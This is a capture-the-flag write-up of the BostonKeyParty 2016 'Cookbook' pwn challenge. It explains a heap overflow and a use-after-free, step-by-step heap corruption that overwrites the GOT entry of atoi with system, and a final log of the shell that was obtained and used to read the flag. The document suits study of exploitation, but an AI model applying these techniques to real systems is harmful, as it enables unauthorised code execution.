
## BostonKeyParty CTF 2016 - Cookbook (Pwn 6pt)
##### 04/03 - 06/03/2016 (48hr)
___
### Description: 
a top chef wrote this cookbook for me but i think he has an extra secret recipe!

cookbook.bostonkey.party 5000
___
### Solution
This challenge has a heap overflow vulnerability. However, except of heap metadata we can also
overwrite some pointers of the allocated objects. The binary was very big and was messing with
many linked lists and pointers to them.

Once I found the vulnerability, I had to take a decision: To either mess the heap and go for a
direct heap overflow, or start corrupting pointers and do a UAF exploit. Unfortunately (for me)
I picked the 2nd option hoping that it will be easier. But I was wrong. So get ready for a 
complicated solution :\

Binary was very big, so reversing it was a challenge by itself, so I'll only present the most
important parts of the reversing process. I renamed many things to give them reasonable names 
and make analysis easier. Let's start with main:
```assembly
.text:0804A412                   loc_804A412:   ; CODE XREF: MAIN_804A3B4+3Cj
.text:0804A412 E8 F8 E7 FF FF        call    read_name_8048C0F
.text:0804A417 E8 B6 FE FF FF        call    print_header_804A2D2
.text:0804A41C E8 9E FE FF FF        call    constructors_804A2BF
.text:0804A421 E8 27 E5 FF FF        call    menu_loop_804894D
.text:0804A426 E8 C2 F7 FF FF        call    destructors_8049BED
.text:0804A42B E8 3B FF FF FF        call    print_footer_804A36B
```
read_name() simply reads your name and stores in in the heap. Nothing special. print_header()
and print_footer() are not important too. When program starts, there are already some recipes
and some ingredients there. constructors() is responsible for allocating memory for these
objects. Similary destructors() is responsible for releasing the allocated memory for these 
objects. The most important function here is menu_loop() which does all the work.

Before we analyze menu_loop(), let's see the objects and how program works (the result after
a painful reversing process :P).

First of all we have the list items. Each item is 8 bytes long and has 2 pointers. The first
pointer points to an object, and the second points to the next item on the list:
```
        0            4            8
        +------------+------------+
list -> | object_ptr |   *next    |
        +------------+------------+
```
Next we have ingredients. Each ingredient is 144 bytes long and has 3 fields:
```
              0           4           8                                    144
              +-----------+-----------+--------------------------------------+
ingredient -> | calories  |   price   |                 name                 |
              +-----------+-----------+--------------------------------------+
```
Then we have recipe objects. Each recipe is 1036 bytes long and has 4 fields. The first field is
ingr_list which is pointer to a list of ingredient objects. Next is quan_list which is a pointer 
a to list of numbers. Each number represents the quantity of the ingredient. Note that these 
lists are parallel; The i-th number in quan_list represents the quantity of the i-th ingredient. 
After these two pointers there's a NULL padding, and after that there's the recipe's 
name/instructions (the one overrides the other).
```
          0           4           8       140                                 1036
          +-----------+-----------+-------+--------------------------------------+
recipe -> | ingr_list | quan_list | NULLs |           name/instructions          |
          +-----------+-----------+-------+--------------------------------------+
```

Finally we have the cookbook. Cookbook has 2 independent fields: A name and a pointer to a list
that contain all recipes.

Now we're done with the objects. Let's see how this thing works. It has pretty much all the
functionality that you expect: You can add/remove ingredients and recipes. There are functions
for list manipulation:
```
    [1]. List Length -> list_len_804890F
    [2]. Insert      -> add_to_list_8048754
    [3]. Delete      -> list_del_80487B5
    [4]. Get(i)      -> list_get_elt_i_80488C2
    [5]. Search      -> list_search_8049C58 (search by name; not for all objects)
```

As you can guess if we remove an ingredient, the recipes that use this ingredient will have 
stale pointers. Thus we have to remove all recipes that use this ingredient. del_ingr_80497F9()
takes care of that.

We can allocate/deallocate memory for ingredients, recipes, lists and the cookbook name too.

___
Now let's move on the actuall vulnerability. This is the code when we allocate memory for a new
recipe:
```assembly
.text:0804919B                   NEW_RECIPE_804919B:        ; CODE XREF: create_recipe_8049092+107j
.text:0804919B                                              ; DATA XREF: .rodata:off_804A9DCo
.text:0804919B 83 EC 08              sub     esp, 8         ; jumptable 08049199 case 110
.text:0804919E 68 0C 04 00 00        push    40Ch           ; size
.text:080491A3 6A 01                 push    1              ; nmemb
.text:080491A5 E8 46 F4 FF FF        call    _calloc
.text:080491AA 83 C4 10              add     esp, 10h
.text:080491AD A3 A0 D0 04 08        mov     ds:RECIPE_804D0A0, eax ; total size of recipe struct: 1036
.text:080491B2 E9 06 04 00 00        jmp     LOOP_END_80495BD
```

Recipe size is 0x40c bytes long. But this is what happens when we set the name of the recipe (code
for set the instructions has the same problem with here):
```assembly
.text:0804942F                   NAME_RECIPE_804942F:       ; CODE XREF: create_recipe_8049092+107j
.text:0804942F                                              ; DATA XREF: .rodata:off_804A9DCo
.text:0804942F A1 A0 D0 04 08        mov     eax, ds:RECIPE_804D0A0 ; jumptable 08049199 case 103
.text:08049434 85 C0                 test    eax, eax
.text:08049436 75 15                 jnz     short loc_804944D
.text:08049438 83 EC 0C              sub     esp, 0Ch
.text:0804943B 68 25 A8 04 08        push    offset aCanTDoItOnANul ; "can't do it on a null guy"
.text:08049440 E8 4B F1 FF FF        call    _puts
.text:08049445 83 C4 10              add     esp, 10h
.text:08049448 E9 70 01 00 00        jmp     LOOP_END_80495BD
.text:0804944D
.text:0804944D                   loc_804944D:               ; CODE XREF: create_recipe_8049092+3A4j
.text:0804944D A1 A0 D0 04 08        mov     eax, ds:RECIPE_804D0A0
.text:08049452 05 8C 00 00 00        add     eax, 8Ch
.text:08049457 89 85 4C FF FF FF     mov     [ebp+tmp_nam_B4], eax
.text:0804945D A1 80 D0 04 08        mov     eax, ds:stdin
.text:08049462 83 EC 04              sub     esp, 4
.text:08049465 50                    push    eax              ; stream
.text:08049466 68 0C 04 00 00        push    40Ch             ; n
.text:0804946B FF B5 4C FF FF FF     push    [ebp+tmp_nam_B4] ; s
.text:08049471 E8 DA F0 FF FF        call    _fgets   ; overflow! read 0x40c bytes, but start from 0x8c
.text:08049476 83 C4 10              add     esp, 10h
.text:08049479 E9 3F 01 00 00        jmp     LOOP_END_80495BD
```

The problem here is very obvious and easy to find: We store the name at offset 0x8c (140) within 
the recipe struct as expected. However the author reads up to 0x40c bytes and not up to 
0x40c - 0x8c bytes. This means that it's possible to overflow anything beyond that object.

There's also another bug, when we unset the cookbook name:
```assembly
.text:08048B4E         unset_cookbook_name_8048B4E proc near   ; CODE XREF: menu_loop_804894D:UNSET_CB_NAME_8048A76p
.text:08048B4E 55                    push    ebp
.text:08048B4F 89 E5                 mov     ebp, esp
.text:08048B51 83 EC 08              sub     esp, 8
.text:08048B54 A1 A8 D0 04 08        mov     eax, ds:cookbook_name       ; dangling pointer!
.text:08048B59 83 EC 0C              sub     esp, 0Ch
.text:08048B5C 50                    push    eax                         ; ptr
.text:08048B5D E8 CE F9 FF FF        call    _free
.text:08048B62 83 C4 10              add     esp, 10h
.text:08048B65 90                    nop
.text:08048B66 C9                    leave
.text:08048B67 C3                    retn
.text:08048B67                   unset_cookbook_name_8048B4E endp
```
As you can see we have dangling pointer. If we unset the name, this allocated region will be 
presented as free. Now if we allocate a new object, it will use the memory that cookbook_name
pointer points (of course is the object size is smaller; otherwise it will allocated in an
another memory region). This is our UAF bug and gives us a way to read the contents of this 
region.

___
After finding the bugs, let's see how we can actually exploit them. It's possible to have 
arbitrary reads from any readable memory location and very limited arbitrary writes.

The idea behind arbitrary reads is the following:
```
[1]. Allocate memory for a new recipe
[2]. Add 2 ingredients to that recipe
[3]. Give a name to the recipe and overflow the 1st item of the ingr_list with:
     i)  object_ptr = The address that you want to read
     ii) *next      = NUll

[4]. Print current recipe. Total calories will give what you want.
```

After 2nd step the heap will be like this:
```
/--------------------------\
|                          |
|       +------------+------------+-------------------------+
|   /-- | ingr_list  | quan_list  | NULLs                   |
|   |   |                                                   |
|   |   |                                                   |
|   |   |                 name/instructions                 |
|   |   |                                                   |
|   |   |                                                   |
|   |   |                         +------------+------------|
|   |   |                         | chunk meta | chunk meta |
|   |   +------------+------------+------------+------------+
|   \-> |    ptr2    |    nxt1    | chunk meta | chunk meta |
|       +------------+------------+------------+------------+
\-----> |     1      |    nxt2    | chunk meta | chunk meta |
        +------------+------------+------------+------------+
nxt1 -> |    ptr1    |    NULL    | chunk meta | chunk meta |
        +------------+------------+------------+------------+
nxt2 -> |     1      |    NULL    |                         | 
        +------------+------------+                         +
        |                                                   |
        |                    free space                     |
        |                                                   |
        +---------------------------------------------------+
        .
        .
        .
        +-----------+-----------+---------------------------+
ptr1 -> |     0     |     6     |           water           |
        +-----------+-----------+---------------------------+

        +-----------+-----------+---------------------------+
ptr2 -> |     1     |     5     |          tomato           |
        +-----------+-----------+---------------------------+
        (ptr1 and ptr2 will actually be above the new ingredient but nvm)
```

After the overflow, ptr2 will have our desired address and nxt1 will be NULL. When we print
current recipe, the total calories will be included. We have to multiply the calories with the
quantiry for each ingredient and then take the summary for all ingredients. In order to do that
we iterate over ingr_list and we read the first 4 bytes from each pointer (ptr1, ptr2, etc.)
which are the ingredient calories. Then we multiply with the quantity, by iterating over quan_list
and we return the summation all ingredients as the total number of calories.

That's why we only have 1 ingredient and we set quantity to 1, so the total calories will be
the 4 bytes of the address that we read. Note that we don't have to add 2 ingredients; 1 is 
enough, but who cares?

Note that we can repeat this process as many times as we want (be careful though: do not
free any objects here because chunk headers are corrupted), so we can leak any address that 
we want.
___
Now the hard part: The arbitrary write. Unfortunately the abritrary write is very limited and
very hard to achieve. Let's see how our global (and ASLR aware) objects are organized:
```assembly
.got:0804CFFC                       ; Segment type: Pure data
.got:0804CFFC                       ; Segment permissions: Read/Write

.got.plt:0804D000 ??                db    ? ;
.....
.got.plt:0804D00B ??                db    ? ;
.got.plt:0804D00C B0 D0 04 08       off_804D00C dd offset strcmp            ; DATA XREF: _strcmpr
.got.plt:0804D010 B4 D0 04 08       off_804D010 dd offset printf            ; DATA XREF: _printfr
.got.plt:0804D014 B8 D0 04 08       off_804D014 dd offset strcspn           ; DATA XREF: _strcspnr
.got.plt:0804D018 70 B0 E7 F7       off_804D018 dd offset free-101D204Ch    ; DATA XREF: _freer
.got.plt:0804D01C C0 D0 04 08       off_804D01C dd offset memcpy            ; DATA XREF: _memcpyr
.got.plt:0804D020 C4 D0 04 08       off_804D020 dd offset fgets             ; DATA XREF: _fgetsr
.got.plt:0804D024 C8 D0 04 08       off_804D024 dd offset alarm             ; DATA XREF: _alarmr
.got.plt:0804D028 CC D0 04 08       off_804D028 dd offset __stack_chk_fail  ; DATA XREF: ___stack_chk_failr
.got.plt:0804D02C D0 D0 04 08       off_804D02C dd offset malloc            ; DATA XREF: _mallocr
.got.plt:0804D030 D4 D0 04 08       off_804D030 dd offset puts              ; DATA XREF: _putsr
.got.plt:0804D034 EC D0 04 08       off_804D034 dd offset __gmon_start__    ; DATA XREF: ___gmon_start__r
.got.plt:0804D038 D8 D0 04 08       off_804D038 dd offset strtoul           ; DATA XREF: _strtoulr
.got.plt:0804D03C DC D0 04 08       off_804D03C dd offset __libc_start_main ; DATA XREF: ___libc_start_mainr
.got.plt:0804D040 E0 D0 04 08       off_804D040 dd offset setvbuf           ; DATA XREF: _setvbufr
.got.plt:0804D044 E4 D0 04 08       off_804D044 dd offset atoi              ; DATA XREF: _atoir
.got.plt:0804D048 E8 D0 04 08       off_804D048 dd offset calloc            ; DATA XREF: _callocr
.got.plt:0804D048                   _got_plt ends

.data:0804D04C                   ; .data:0804D04C
.data:0804D04C                   ; Segment type: Pure data
.data:0804D04C                   ; Segment permissions: Read/Write
.....
.bss:0804D080                    ; Segment type: Uninitialized
.bss:0804D080                    ; Segment permissions: Read/Write
.....
.bss:0804D08C ?? ?? ?? ??       recipe_list_804D08C dd ?                ; DATA XREF: create_recipe_8049092+4C1o
.bss:0804D08C                                                           ; print_recipes_80496FA+6o ......
.bss:0804D090 ?? ?? ?? ??       unk_804D090 db
.bss:0804D094 ?? ?? ?? ??       ingr_list_804D094 dd 
.bss:0804D098 ?? ?? ?? ??       X_804D098 db    ? 
.bss:0804D09C ?? ?? ?? ??       TEMP_INGR_804D09C dd ?
.bss:0804D0A0 ?? ?? ?? ??       RECIPE_804D0A0 dd ?
.bss:0804D0A4 ?? ?? ?? ??       align 8
.bss:0804D0A8 ?? ?? ?? ??       cookbook_name dd ?
.bss:0804D0AC ?? ?? ?? ??       name_804D0AC dd ?
```

Our goal is to ovewrite address of atoi() in .got with the address of system(), and then trigger
it, by setting the number of calories of an ingredient. 

We start by allocating a large object in the heap (by giving a name to the cookbook). Then,
we allocate memory for a new ingredient (without saving it) and then we go remove the cookbook 
name. After that we create a new recipe and we add a new ingredient to it. Let's how's the 
heap and our global pointers so far:
```
X_804D098         = NULL
TEMP_INGR_804D09C = tmp
cookbook_name     = R

/--------------------------\
|                          |
| R->   +------------+------------+-------------------------+
|   /-- | ingr_list  | quan_list  | NULLs                   |
|   |   |                                                   |
|   |   |                                                   |
|   |   |                 name/instructions                 |
|   |   |                                                   |
|   |   |                                                   |
|   |   |                         +------------+------------|
|   |   |                         | chunk meta | chunk meta |
|   |   +------------+------------+------------+------------+
|   \-> |    ptr1    |    NULL    | chunk meta | chunk meta |
|       +------------+------------+------------+------------+
\-----> |     1      |    NULL    | chunk meta | chunk meta |
        +------------+------------+------------+------------+
tmp ->  |  calories  |   price    |                         |
        +------------+------------+                         |
        |                                                   | 
        |                  ingredient name                  |
        |                                                   |
        +---------------------------------------------------+
ptr ->  ....        
```

Now we overwrite next pointer of ingr_list with 0x0804D094 (the address of ingr_list_804D094).
This means that local ingr_list for this recipe will be:
```
     somewhere in heap               804D094    X_804D098
             +-------+---------+        +-------+------+
ingr_list -> | dummy | 804D094 | --->   | dummy | NULL |
             +-------+---------+        +-------+------+
```
Ok. We created a fake list item in .bss. Now the dirty stuff comes. We insert a new ingredient
to the recipe. First we'll create a new list item in the heap (right after the new ingredient)
and then we'll link it at the end of the list. This means that global variable X will get a
value and it won't be NULL anymore, so we'll avoid any potential crashes.

What we did now? In some sense we were injected an item in the list, and this item is located
on .bss! X_804D098 now points to ptr+8, and at ptr+8 there's the next item on the list.

Now it's time for grande finale. A last overflow that will set all the pointers with the
desired values. We must be veeeeeeeery careful here and not corrupt any chunk headers on the
heap (this is not hard, as the object sizes are known). Let's see the heap layout after
the final overflow:

```
X_804D098         = ptr+8
TEMP_INGR_804D09C = tmp
cookbook_name     = R

/--------------------------\
|                          |
| R->   +------------+------------+-------------------------+
|   /-- | ingr_list  | quan_list  | NULLs                   |
|   |   |                                                   |
|   |   |                                                   |
|   |   |                AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA |
|   |   | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA |
|   |   | AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA |
|   |   | AAAAAAAAAAAAAAAAAAAAAAA +------------+------------|
|   |   | AAAAAAAAAAAAAAAAAAAAAAA |  00000000  |  00000011  |
|   |   +------------+------------+------------+------------+
|   \-> |  str1 - 8  |      X     |  00000000  |  00000099  |
|       +------------+------------+------------+------------+
\-----> |    name    |  0804CFF8  |                         |       
 tmp -/ +------------+------------+                         |
        |                                                   | 
        |                  ingredient name                  |
        |                                                   |
        +---------------------------------------------------+
ptr ->  ....
.
.
str1 -> "saved!"
name -> "ispo_1234567890" (chef's name)
```

Having this layout, we're going to remove an ingredient from the recipe. But which
ingredient? The one with name "4567890" (chef's name without the first 8 characters).
Let's see what's going on upon delete. Our ingr_list now becomes:
```
     somewhere in heap               X_804D098      TEMP_INGR   tmp
             +----------+---------+      +---------+-----+      +------+----------+
ingr_list -> | str1 - 8 |    X    | ---> | ptr + 8 | tmp | ---> | name | 0804CFF8 | --\
             +----------+---------+      +---------+-----+      +------+----------+   |
                                                                                      |
           /--------------------------------------------------------------------------/
           |  .got-8
           |   +------+------+
           \-> | NULL | NULL |
               +------+------+
```
First we have to get list length. There's no problem with that because all next pointers are
valid and a NULL exists after a while. Then we have to find the desired ingredient to remove.
We search by name, so we're looking at (ptr+8) for each item. The first is str1 - 8. So we look
at str1 - 8 + 8 = str1 = "saved!", which doesn't match. The 2nd is at ptr+8 which can be 
anything (we don't care as long as is a readble region), so we don't have a match here. Then, 
it's name pointer ("ispo_1234567890"). We compare name+8 against our name ("567890") and in 
this case we have a match.

This means that we have to delete this element. How we delete it? First we fix the next
pointers and then we free the allocated memory.

In this case TEMP_INGR will now point to .got-8 (and not at tmp). Also we're going to release
name (it's ok because it's a valid pointer on the heap) and then we're going to release tmp
(which is still ok ase it's a valid pointer on the heap, and its chunk header is valid).

The result after that, is that TEMP_INGR points to .got - 8.

Now we go back to the main menu, and we add a new ingredient. Because TEMP_INGR is not NULL,
we can edit our "existing" ingredient. So, we set a name for our ingredient. Name will be
stored at TEMP_INGR+8 which is exactly the beginning of .got. Game over.


However, because ingredient naming code uses memcpy, it will overwrite all entries in .got:
```assembly
.text:08048E71 A1 9C D0 04 08        mov     eax, dword ptr ds:TEMP_INGR_804D09C
.text:08048E76 83 C0 08              add     eax, 8                      ; ingr->name
.text:08048E79 83 EC 04              sub     esp, 4
.text:08048E7C 68 80 00 00 00        push    80h                         ; n
.text:08048E81 FF 75 D0              push    [ebp+tmp_name_30]           ; src
.text:08048E84 50                    push    eax                         ; dest
.text:08048E85 E8 B6 F6 FF FF        call    _memcpy
```
There's no problem with that, because we can leak any address we want, so we can fix the
whole table. We fix only the function that are really needed in order to avoid crash, and we
replace address of atoi() with address of system.

Now the only thing that is left to do, is to trigger atoi(). We can do that by setting the
calories for the existing ingredient:

```assembly
.text:08048F47                   SET_CALORIES_8048F47:                   ; CODE XREF: add_ingrendient_8048C7B+102j
.text:08048F47                                                           ; DATA XREF: .rodata:off_804A868o
.text:08048F47 83 EC 08              sub     esp, 8                      ; jumptable 08048D7D case 115
.text:08048F4A 6A 01                 push    1                           ; size
.text:08048F4C 68 80 00 00 00        push    80h                         ; nmemb
.text:08048F51 E8 9A F6 FF FF        call    _calloc
.text:08048F56 83 C4 10              add     esp, 10h
.text:08048F59 89 45 DC              mov     [ebp+var_24], eax
.text:08048F5C A1 9C D0 04 08        mov     eax, dword ptr ds:TEMP_INGR_804D09C
.text:08048F61 85 C0                 test    eax, eax
.text:08048F63 74 53                 jz      short loc_8048FB8
.text:08048F65 A1 80 D0 04 08        mov     eax, ds:stdin
.text:08048F6A 83 EC 04              sub     esp, 4
.text:08048F6D 50                    push    eax                         ; stream
.text:08048F6E 68 80 00 00 00        push    80h                         ; n
.text:08048F73 FF 75 DC              push    [ebp+var_24]                ; s
.text:08048F76 E8 D5 F5 FF FF        call    _fgets
.text:08048F7B 83 C4 10              add     esp, 10h
.text:08048F7E 83 EC 08              sub     esp, 8
.text:08048F81 68 EA A5 04 08        push    offset reject               ; "\n"
.text:08048F86 FF 75 DC              push    [ebp+var_24]                ; s
.text:08048F89 E8 92 F5 FF FF        call    _strcspn
.text:08048F8E 83 C4 10              add     esp, 10h
.text:08048F91 89 C2                 mov     edx, eax
.text:08048F93 8B 45 DC              mov     eax, [ebp+var_24]
.text:08048F96 01 D0                 add     eax, edx
.text:08048F98 C6 00 00              mov     byte ptr [eax], 0
.text:08048F9B 83 EC 0C              sub     esp, 0Ch
.text:08048F9E FF 75 DC              push    [ebp+var_24]                ; nptr
.text:08048FA1 E8 3A F6 FF FF        call    _atoi
.text:08048FA6 83 C4 10              add     esp, 10h
.text:08048FA9 89 45 E0              mov     [ebp+var_20], eax
.text:08048FAC A1 9C D0 04 08        mov     eax, dword ptr ds:TEMP_INGR_804D09C
.text:08048FB1 8B 55 E0              mov     edx, [ebp+var_20]
.text:08048FB4 89 10                 mov     [eax], edx
.text:08048FB6 EB 10                 jmp     short loc_8048FC8
```
However instead of giving the number of calories we'll give "/bin/sh", and we'll end up
with an open shell. We read "key" file and after a long time we get the flag:
**BKPCTF{hey_my_grill_doesnt_work_here}**

```

root@nogirl:~/ctf/bostonkeyparty# ./cookbook_expl.py 
    [..... TRUNCATED FOR BREVITY .....]
    ----------------------------------------------------------------
    Received:

    Sending:  /bin/sh
     *** Opening Shell *** 
    whoami
        nobody
    ls -la
        total 1816
        drwxr-xr-x 2 cooking-manager cooking-manager    4096 Mar  5 01:38 .
        drwxr-xr-x 3 root            root               4096 Mar  4 03:51 ..
        -rw-r--r-- 1 cooking-manager cooking-manager     220 Mar  4 03:51 .bash_logout
        -rw-r--r-- 1 cooking-manager cooking-manager    3771 Mar  4 03:51 .bashrc
        -rw-r--r-- 1 cooking-manager cooking-manager     675 Mar  4 03:51 .profile
        -rwxr-xr-x 1 root            root              17936 Mar  4 04:05 cookbook
        -rw-r--r-- 1 root            root                 38 Mar  5 01:38 key
        -rwxrwxr-x 1 cooking-manager cooking-manager 1807496 Mar  4 04:10 libc.so.6
        -rwxr-xr-x 1 root            root                136 Mar  4 23:46 run.sh
    cat key
        BKPCTF{hey_my_grill_doesnt_work_here}
    cat run.sh
        #!/bin/bash
        socat TCP-LISTEN:5000,fork,reuseaddr,su=nobody SYSTEM:"timeout 60 LD_PRELOAD=/home/cooking-manager/libc.so.6 ./cookbook $1"
    exit
    *** Connection closed by remote host ***
```
___
